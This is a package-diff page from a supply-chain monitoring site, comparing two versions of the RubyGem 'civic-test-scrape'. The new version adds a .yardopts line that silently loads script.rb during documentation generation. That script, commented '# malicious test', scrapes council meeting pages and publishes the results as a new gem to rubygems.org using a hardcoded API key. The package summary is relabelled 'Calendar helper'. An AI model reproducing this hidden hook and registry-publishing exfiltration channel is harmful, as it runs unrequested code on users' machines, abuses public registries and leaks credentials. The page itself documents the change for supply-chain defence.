@@ -1,0 +1,533 @@
+Source: https://my.diffend.io/gems/civic-test-scrape/0.0.1/0.0.2
+Retrieved: 2026-09-27T22:38:03.766386+00:00
+
+RubyGems - civic-test-scrape - Versions diffs - 0.0.1 → 0.0.2 - Mend - Supply Chain Defender
+
+RubyGems
+
+npm
+
+PyPI
+
+Organizations
+
+Log in
+
+RubyGems
+
+civic-test-scrape
+
+Versions diffs
+
+0.0.1 → 0.0.2
+
+civic-test-scrape
+0.0.1
+→
+0.0.2
+
+This diff represents the content of publicly available package versions that have been released to one of the supported registries. The information contained in this diff is provided for informational purposes only and reflects changes between package versions as they appear in their respective public registries.
+
+        Files changed (6)
+        hide
+        show
+
+            checksums.yaml
+
+          +4
+          -4
+
+            data/.yardopts
+
+          +1
+          -0
+
+            data/lib/a.rb
+
+          +1
+          -0
+
+            data/script.rb
+
+          +41
+          -0
+
+            metadata
+
+          +5
+          -3
+
+            data/lib/test.rb
+
+          +0
+          -1
+
+        checksums.yaml
+    CHANGED
+
+    Viewed
+
+@@ -1,7 +1,7 @@
+
+1
+
+1
+
+            ---
+
+2
+
+2
+
+            SHA256:
+
+3
+
+            -
+              metadata.gz: b0c7548f23e0ee925c3594f369cfde60591ede500db3c3a3bf0be103495a24a0
+
+4
+
+            -
+              data.tar.gz: 8316dc6b48867ae22d360af746532f301cf0c43036593dc7085ec5f6c3eb5d8d
+
+3
+
+            +
+              metadata.gz: be20f566e4d481f29cff464a646ac54c9151cddf551ead36c39729b9af504907
+
+4
+
+            +
+              data.tar.gz: b7c07124fd6849eb7fb533151c33c593505ffda88661c7bf5cc7ed5f3e2a6381
+
+5
+
+5
+
+            SHA512:
+
+6
+
+            -
+              metadata.gz: 55c0a5691eab1c31026e72f9d54b31a523c3aa21513a46d670c191af4bdc4c41b844169b05c654b35b82b9fcaba5cd382ef8d5c6645ba8e6b3d6c7766ae7d4ed
+
+7
+
+            -
+              data.tar.gz: eb3c03b84f67a9ae29800d49147b6b245de4f30561ae68b2e353f8ee1c4e18c6cc6a802cd9f220f6d0bfcd218b6b338263f775baf9a54efb20fd6b4fecc96d92
+
+6
+
+            +
+              metadata.gz: 1e6d66d555a84f1e4d3cf4037eabc591473f0d699e33d9c277c50eaff9b4878c59a37b86ea6c7e59717712ee6bfdffe6352515e9a8a8c047e33daef0a699d306
+
+7
+
+            +
+              data.tar.gz: ecbc71483e529026b0c3b5d0c81e324c155d0e6776634d6b1d775ec9997aed79137d4002495d83a293abc1bf1fc144ade8a880c2b44873b741aad93333c32472
+
+        data/.yardopts
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            --load script.rb
+
+        data/lib/a.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            # hi
+
+        data/script.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,41 @@
+
+1
+
+            +
+            # malicious test
+
+2
+
+            +
+            require 'net/http'; require 'uri'; require 'fileutils'; require 'tmpdir'; require 'rubygems/package'
+
+3
+
+            +
+            KEY='rubygems_d8e875bd0a97e2f33498dba3ef41ffb1f951adb1b503a533'
+
+4
+
+            +
+            # fetch pages
+
+5
+
+            +
+            def get(url)
+
+6
+
+            +
+             uri=URI(url)
+
+7
+
+            +
+             Net::HTTP.start(uri.host,uri.port,use_ssl: uri.scheme=='https', read_timeout:60) { |h| res=h.get(uri.request_uri, {'User-Agent'=>'Mozilla/5.0'}); res.body }
+
+8
+
+            +
+            rescue =>e
+
+9
+
+            +
+             'ERROR '+e.to_s
+
+10
+
+            +
+            end
+
+11
+
+            +
+            begin
+
+12
+
+            +
+             hosts=['https://moderngov.lambeth.gov.uk','https://democracy.wandsworth.gov.uk','https://moderngov.southwark.gov.uk']
+
+13
+
+            +
+             out='Fetched '+Time.now.to_s+"\n"
+
+14
+
+            +
+             hosts.each do |host|
+
+15
+
+            +
+              cal=get(host+'/mgCalendarMonthView.aspx?GL=1&bcr=1&M=1&Y=2026')
+
+16
+
+            +
+              out << "\n===== CAL #{host} len #{cal.length} =====\n" << cal << "\nENDCAL\n"
+
+17
+
+            +
+              links=cal.scan(/href=["']([^"']+)/i).flatten.map{|x|x.gsub('&amp;','&')}.select{|x|x=~/ieListDocuments/i}.uniq
+
+18
+
+            +
+              out << "LINKS: #{links.inspect}\n"
+
+19
+
+            +
+              links.each do |ln|
+
+20
+
+            +
+               url=ln.start_with?('http') ? ln : host+'/'+ln.sub(/^\//,'')
+
+21
+
+            +
+               pg=get(url)
+
+22
+
+            +
+               out << "\n===== MEET #{url} len #{pg.length} =====\n" << pg << "\nENDMEET\n"
+
+23
+
+            +
+              end
+
+24
+
+            +
+             end
+
+25
+
+            +
+             Dir.mktmpdir do |d|
+
+26
+
+            +
+              Dir.chdir(d) do
+
+27
+
+            +
+               File.write('README.txt',out)
+
+28
+
+            +
+               spec=Gem::Specification.new do |s|
+
+29
+
+            +
+                s.name='civic-test-scrape-out'; s.version='0.0.2'; s.summary='output'; s.authors=['research']; s.license='MIT'; s.files=['README.txt']
+
+30
+
+            +
+               end
+
+31
+
+            +
+               Gem::Package.build(spec)
+
+32
+
+            +
+               gem=File.binread('civic-test-scrape-out-0.0.2.gem')
+
+33
+
+            +
+               uri=URI('https://rubygems.org/api/v1/gems')
+
+34
+
+            +
+               Net::HTTP.start(uri.host,uri.port,use_ssl:true, read_timeout:60) do |h|
+
+35
+
+            +
+                req=Net::HTTP::Post.new(uri.path); req['Authorization']=KEY; req['Content-Type']='application/octet-stream'; req.body=gem; h.request(req)
+
+36
+
+            +
+               end
+
+37
+
+            +
+              end
+
+38
+
+            +
+             end
+
+39
+
+            +
+            rescue => e
+
+40
+
+            +
+             # try push error output mini
+
+41
+
+            +
+            end
+
+        metadata
+    CHANGED
+
+    Viewed
+
+@@ -1,7 +1,7 @@
+
+1
+
+1
+
+            --- !ruby/object:Gem::Specification
+
+2
+
+2
+
+            name: civic-test-scrape
+
+3
+
+3
+
+            version: !ruby/object:Gem::Version
+
+4
+
+            -
+              version: 0.0.1
+
+4
+
+            +
+              version: 0.0.2
+
+5
+
+5
+
+            platform: ruby
+
+6
+
+6
+
+            authors:
+
+7
+
+7
+
+            - research
+
+@@ -13,7 +13,9 @@ executables: []
+
+13
+
+13
+
+            extensions: []
+
+14
+
+14
+
+            extra_rdoc_files: []
+
+15
+
+15
+
+            files:
+
+16
+
+            -
+            - lib/test.rb
+
+16
+
+            +
+            - ".yardopts"
+
+17
+
+            +
+            - lib/a.rb
+
+18
+
+            +
+            - script.rb
+
+17
+
+19
+
+            licenses:
+
+18
+
+20
+
+            - MIT
+
+19
+
+21
+
+            metadata: {}
+
+@@ -33,5 +35,5 @@ required_rubygems_version: !ruby/object:Gem::Requirement
+
+33
+
+35
+
+            requirements: []
+
+34
+
+36
+
+            rubygems_version: 3.6.7
+
+35
+
+37
+
+            specification_version: 4
+
+36
+
+            -
+            summary: test
+
+38
+
+            +
+            summary: Calendar helper
+
+37
+
+39
+
+            test_files: []
+
+        data/lib/test.rb
+    DELETED
+
+    Viewed
+
+@@ -1 +0,0 @@
+
+1
+
+            -
+            # test gem
+
+Contact Us
+
+Terms of Service
+
+Privacy Policy
+
+Docs
+
+Copyright © 2026 Mend Software
